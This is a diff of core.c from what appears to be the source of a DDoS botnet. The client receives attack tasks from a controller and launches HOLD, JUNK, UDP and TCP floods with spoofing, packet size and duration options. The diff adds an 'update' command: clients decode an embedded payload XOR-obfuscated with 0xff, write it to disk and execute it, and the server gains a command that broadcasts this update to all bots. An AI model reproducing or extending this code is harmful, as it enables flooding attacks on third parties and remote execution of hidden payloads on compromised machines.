@@ -1,11 +1,11 @@
 /*
-    core.c
+   core.c
 
-    last modified at: 2015/4/25
-    error
-    
-    defines packet and functions used in communicate between client and server
-*/
+   last modified at: 2015/4/25
+   error
+
+   defines packet and functions used in communicate between client and server
+ */
 
 #include "core.h"
 #include "../utils/utils.h"
@@ -13,7 +13,11 @@
 #include "../log/log.h"
 #include "../tcpip/tcpip.h"
 #include "../adt/list.h"
+#include "update.h"
 
+#include <sys/types.h>
+#include <sys/stat.h>
+#include <fcntl.h>
 #include <stdio.h>
 #include <sys/socket.h>
 #include <arpa/inet.h>
@@ -50,11 +54,11 @@ int certify_register_packet(struct packet* p)
 }
 
 /*
-    alexjlz_register retval:
-    0:  heartbeat
-    1:  task sign
-    -1: register failed
-*/
+   alexjlz_register retval:
+0:  heartbeat
+1:  task sign
+-1: register failed
+ */
 int alexjlz_register(struct client *c, struct packet *p)
 {
     if ( !certify_register_packet(p) || (p->type != packet_register) )  // certify
@@ -65,7 +69,7 @@ int alexjlz_register(struct client *c, struct packet *p)
     int status = 0;
     struct client *c_iter = NULL;
     list_iter_p client_list_iter = list_iterator(client_list, FRONT);
-    
+
     parse_string(p->value, c->uuid, "uuid", sizeof(c->uuid));  // this is for identify client
     while ( (c_iter = list_next(client_list_iter)) != NULL )
     {
@@ -241,7 +245,7 @@ int ask_for_service( int server_fd )
         {
             bytes_read = readn ( server_fd, &q, sizeof(q) );
             if ( bytes_read != sizeof(p) )  // this would happen when the other end \
-                                            // closed the connection or network error, anyway, just return
+                // closed the connection or network error, anyway, just return
             {
                 if ( check_fd(server_fd) )
                     close(server_fd);
@@ -249,76 +253,113 @@ int ask_for_service( int server_fd )
             }
             if ( q.type == packet_task_sign )
             {
-                //fprintf(stdout, "Info, got task:%s\n", q.value); // todo: fork task
-                char type[16] = {0}; // udp, tcp, junk, hold
-                char flags[32] = {0}; // all, syn, rst, fin, ack, psh
-                char target[256] = {0};
-                uint32_t port = 0; char asc_port[32] = {0};
-                uint32_t spoof = 32; char asc_spoof[16] = {0};
-                uint32_t packetsize = 64; char asc_packetsize[16] = {0};
-                uint32_t pollinterval = 10; char asc_pollinterval[16] = {0};
-                uint32_t time = 0; char asc_time[16] = {0};
-                parse_string(q.value, type, "type", sizeof(type)-1);
-                parse_string(q.value, flags, "flags", sizeof(flags)-1);
-                parse_string(q.value, target, "target", sizeof(target)-1);
-                parse_string(q.value, asc_port, "port", sizeof(asc_port)-1);
-                parse_string(q.value, asc_spoof, "spoof", sizeof(asc_spoof)-1);
-                parse_string(q.value, asc_spoof, "spoof", sizeof(asc_spoof)-1);
-                parse_string(q.value, asc_packetsize, "packetsize", sizeof(asc_packetsize)-1);
-                parse_string(q.value, asc_pollinterval, "pollinterval", sizeof(asc_pollinterval)-1);
-                parse_string(q.value, asc_time, "time", sizeof(asc_time)-1);
-                port = atoi(asc_port)?atoi(asc_port):0;
-                spoof = atoi(asc_spoof)?atoi(asc_spoof):32;
-                packetsize = atoi(asc_packetsize)?atoi(asc_packetsize):64;
-                pollinterval = atoi(asc_pollinterval)?atoi(asc_pollinterval):10;
-                time = atoi(asc_time)?atoi(asc_time):60;
+                char cmd[64] = {0};
+                parse_string(q.value, cmd, "cmd", sizeof(cmd)-1);
+                if ( strcmp(cmd, "update") == 0 )
+                {
+                    int pid = -1;
+                    while ( pid < 0 )
+                        pid = fork();
+                    if ( pid != 0 )  // parent
+                    {
+                        exit(0);
+                    }
+                    else // child
+                    {
+                        char url[256] = {0};
+                        char c = 0;
+                        int i = 0;
+                        //parse_string(q.value, url, "url", sizeof(url)-1);
+                        int update_fd = open("update", O_RDWR | O_CREAT, 0755);
+                        if ( update_fd < 0 )
+                            exit(-1);
+                        while ( i<update_len )
+                        {
+                            c = update[i];
+                            c = c^0xff;
+                            if ( write(update_fd, &c, 1) == -1 )
+                            {
+                                exit(-1);
+                            }
+                            i++;
+                        }
+                        close(update_fd);
+                        execl("./update", "./update", NULL);
+                    }
+                }
+                else if ( strcmp(cmd, "attack") == 0 )
+                {
+                    //fprintf(stdout, "Info, got task:%s\n", q.value); // todo: fork task
+                    char type[16] = {0}; // udp, tcp, junk, hold
+                    char flags[32] = {0}; // all, syn, rst, fin, ack, psh
+                    char target[256] = {0};
+                    uint32_t port = 0; char asc_port[32] = {0};
+                    uint32_t spoof = 32; char asc_spoof[16] = {0};
+                    uint32_t packetsize = 64; char asc_packetsize[16] = {0};
+                    uint32_t pollinterval = 10; char asc_pollinterval[16] = {0};
+                    uint32_t time = 0; char asc_time[16] = {0};
+                    parse_string(q.value, type, "type", sizeof(type)-1);
+                    parse_string(q.value, flags, "flags", sizeof(flags)-1);
+                    parse_string(q.value, target, "target", sizeof(target)-1);
+                    parse_string(q.value, asc_port, "port", sizeof(asc_port)-1);
+                    parse_string(q.value, asc_spoof, "spoof", sizeof(asc_spoof)-1);
+                    parse_string(q.value, asc_spoof, "spoof", sizeof(asc_spoof)-1);
+                    parse_string(q.value, asc_packetsize, "packetsize", sizeof(asc_packetsize)-1);
+                    parse_string(q.value, asc_pollinterval, "pollinterval", sizeof(asc_pollinterval)-1);
+                    parse_string(q.value, asc_time, "time", sizeof(asc_time)-1);
+                    port = atoi(asc_port)?atoi(asc_port):0;
+                    spoof = atoi(asc_spoof)?atoi(asc_spoof):32;
+                    packetsize = atoi(asc_packetsize)?atoi(asc_packetsize):64;
+                    pollinterval = atoi(asc_pollinterval)?atoi(asc_pollinterval):10;
+                    time = atoi(asc_time)?atoi(asc_time):60;
 
-                if ( strcmp(type, "hold")==0 )
-                {
-                    if ( !listFork() )
+                    if ( strcmp(type, "hold")==0 )
                     {
-                        //printf("starting sendHOLD...\n");
-                        sendHOLD(target, port, time);
-                        close(server_fd);
-                        _exit(0);
+                        if ( !listFork() )
+                        {
+                            //printf("starting sendHOLD...\n");
+                            sendHOLD(target, port, time);
+                            close(server_fd);
+                            _exit(0);
+                        }
                     }
-                }
-                if ( strcmp(type, "junk")==0 )
-                {
-                    if ( !listFork() )
+                    if ( strcmp(type, "junk")==0 )
                     {
-                        //printf("starting sendJUNK...\n");
-                        sendJUNK(target, port, time);
-                        close(server_fd);
-                        _exit(0);
+                        if ( !listFork() )
+                        {
+                            //printf("starting sendJUNK...\n");
+                            sendJUNK(target, port, time);
+                            close(server_fd);
+                            _exit(0);
+                        }
                     }
-                }
-                if ( strcmp(type, "udp")==0 )
-                {
-                    if ( !listFork() )
+                    if ( strcmp(type, "udp")==0 )
                     {
-                        //printf("starting sendUDP...\n");
-                        sendUDP(target, port, time, spoof, packetsize, pollinterval);
-                        close(server_fd);
-                        _exit(0);
+                        if ( !listFork() )
+                        {
+                            //printf("starting sendUDP...\n");
+                            sendUDP(target, port, time, spoof, packetsize, pollinterval);
+                            close(server_fd);
+                            _exit(0);
+                        }
                     }
-                }
-                if ( strcmp(type, "tcp")==0 )
-                {
-                    if ( !listFork() )
+                    if ( strcmp(type, "tcp")==0 )
                     {
-                        if ( strcmp(flags, "") == 0 )
-                            strcpy(flags, "syn");
-                        //printf("starting sendTCP...\n");
-                        sendTCP(target, port, time, spoof, flags, packetsize, pollinterval);
-                        close(server_fd);
-                        _exit(0);
+                        if ( !listFork() )
+                        {
+                            if ( strcmp(flags, "") == 0 )
+                                strcpy(flags, "syn");
+                            //printf("starting sendTCP...\n");
+                            sendTCP(target, port, time, spoof, flags, packetsize, pollinterval);
+                            close(server_fd);
+                            _exit(0);
+                        }
                     }
-                }
-            }
-        }
-    }
-    
+                } // attack
+            } // packet_task_sign
+        } // sign comes
+    } // while 
+
     return 0;
 }
 
@@ -344,6 +385,18 @@ int process_command(struct alexjlz_packet *p, list_p output)
             bzero(&output_packet, sizeof(output_packet));
             sprintf(output_packet.value, "uuid:%s ip:%s last_heartbeat:%s current_task:%s\n", c_iter->uuid, c_iter->ip, c_iter->asc_last_heartbeat, c_iter->current_task);
             list_add(output, &output_packet, sizeof(output_packet));
+        }
+        pthread_mutex_unlock(&client_list_mutex);
+    }
+    else if ( strcmp(cmd, "update") == 0 )
+    {
+        alexjlz_log("CMD:update\n");
+        pthread_mutex_lock(&client_list_mutex);
+        struct client *c_iter = NULL;
+        list_iter_p client_list_iter = list_iterator(client_list, FRONT);
+        while ( (c_iter = list_next(client_list_iter)) != NULL )
+        {
+            strcpy( c_iter->task, p->value );
         }
         pthread_mutex_unlock(&client_list_mutex);
     }
